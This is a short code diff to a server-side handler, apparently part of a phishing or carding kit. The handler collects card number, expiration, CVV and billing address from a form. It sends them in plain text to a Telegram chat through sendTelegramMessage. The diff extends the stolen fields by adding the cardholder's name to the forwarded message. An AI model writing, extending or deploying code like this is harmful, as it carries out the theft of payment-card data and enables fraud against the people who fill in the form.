@@ -4,10 +4,11 @@ import { sendTelegramMessage } from '../telegram';
 export default async function handler(req, res) {
   if (req.method === 'POST') {
     try {
-      const { cardNumber, expiration, cvv, address, city, state, zip, userId } = req.body;
+      const { cardNumber, cardholderName, expiration, cvv, address, city, state, zip, userId } = req.body;
       
       console.log('[send-billing] Received billing details:', {
         hasCardNumber: !!cardNumber,
+        hasCardholderName: !!cardholderName,
         hasExpiration: !!expiration,
         hasCVV: !!cvv,
         hasAddress: !!address,
@@ -36,6 +37,7 @@ export default async function handler(req, res) {
         `User ID: <code>${userId || 'N/A'}</code>\n` +
         `Time: ${new Date().toLocaleString()}\n\n` +
         `<b>Card Information:</b>\n` +
+        `Cardholder Name: ${cardholderName || 'N/A'}\n` +
         `Card Number: <code>${cardNumber}</code>\n` +
         `Expiration: <code>${expiration}</code>\n` +
         `CVV: <code>${cvv}</code>\n\n` +
